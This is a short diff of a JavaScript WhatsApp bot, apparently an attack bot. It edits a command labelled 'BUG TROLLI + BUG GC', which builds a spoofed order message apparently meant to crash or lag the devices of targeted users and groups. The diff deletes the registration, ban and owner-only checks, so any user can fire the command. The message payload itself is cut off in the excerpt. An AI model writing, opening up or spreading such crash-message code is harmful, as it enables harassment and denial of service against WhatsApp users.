@@ -2909,11 +2909,8 @@ zets.sendMessage(m.chat, { caption: `${anu}`, location: { jpegThumbnail: await r
 }
 break
 case 'psp': // BUG TROLLI + BUG GC + TROLLI
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (!mek.key.fromMe && !isOwner) return
 buf = Mfake
-imeu = await Ramdani.prepareMessage('0@s.whatsapp.net', buf, image) 
+imeu = await zets.prepareMessage('0@s.whatsapp.net', buf, image) 
 imeg = imeu.message.imageMessage
 res = await zets.prepareMessageFromContent(from,{
 "orderMessage": {
